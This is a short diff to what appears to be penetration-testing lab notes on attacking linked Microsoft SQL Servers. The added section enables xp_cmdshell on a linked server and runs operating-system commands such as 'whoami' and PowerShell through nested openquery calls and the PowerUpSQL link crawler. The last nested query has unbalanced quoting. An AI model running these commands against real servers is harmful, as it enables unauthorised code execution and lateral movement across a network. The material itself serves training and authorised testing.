@@ -669,3 +669,16 @@ select * from master..sysservers
 # Enumerating Database Links
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
 ```
+**3. Command Execution:**
+```powershell
+# Command: whoami
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
+# Enumerating Database Links
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+```
+```mysql
+# Enable xp_cmdshell
+EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"
+# Command: whoami
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.eurocorp.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
+```
